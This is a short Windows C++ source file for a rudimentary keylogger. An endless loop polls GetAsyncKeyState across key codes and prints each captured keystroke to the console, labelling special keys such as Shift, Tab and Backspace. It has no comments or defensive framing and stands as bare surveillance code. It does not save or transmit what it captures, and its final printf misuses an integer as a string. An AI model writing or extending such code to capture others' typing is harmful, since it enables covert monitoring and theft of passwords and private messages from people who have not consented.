#include<iostream>
#include <windows.h>
#include <winuser.h>
using namespace std;
void Save(int key_stroke,int lastKeyStroke);

int main() {
	while (true) {
		for (char i = 8, temp = 0;i <= 190;i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i,temp);
				temp = i;
			}
		}
	}
	system("PAUSE");
	return 0;
}
void Save(int key_stroke,int lastKeyStroke) {
	if (key_stroke == 8)
		printf("%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		printf("%s", "\n");
	else if (key_stroke == 32 && lastKeyStroke!=key_stroke)
		printf("%s", " ");
	else if (key_stroke == VK_TAB && lastKeyStroke != key_stroke)
		printf("%s", "[TAB]");
	else if (key_stroke == VK_SHIFT && lastKeyStroke != key_stroke)
		printf("%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL && lastKeyStroke != key_stroke)
		printf("%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE && lastKeyStroke != key_stroke)
		printf("%s", "[ESCAPE]");
	else if (key_stroke == VK_END && lastKeyStroke != key_stroke)
		printf("%s", "[END]");
	else if (key_stroke == VK_HOME && lastKeyStroke != key_stroke)
		printf("%s", "[HOME]");
	else if (key_stroke == VK_LEFT && lastKeyStroke != key_stroke)
		printf("%s", "[LEFT]");
	else if (key_stroke == VK_UP && lastKeyStroke != key_stroke)
		printf("%s", "[UP]");
	else if (key_stroke == VK_RIGHT && lastKeyStroke != key_stroke)
		printf("%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN && lastKeyStroke != key_stroke)
		printf("%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		printf("%s", ".");
	else if(key_stroke!=VK_TAB&&key_stroke != VK_SHIFT&&key_stroke != VK_CONTROL&&key_stroke != VK_ESCAPE&&key_stroke != VK_END
		&&key_stroke != VK_HOME&&key_stroke != VK_LEFT&&key_stroke != VK_UP&&key_stroke != VK_RIGHT&&key_stroke != VK_DOWN)
		printf("%s", &key_stroke);
}
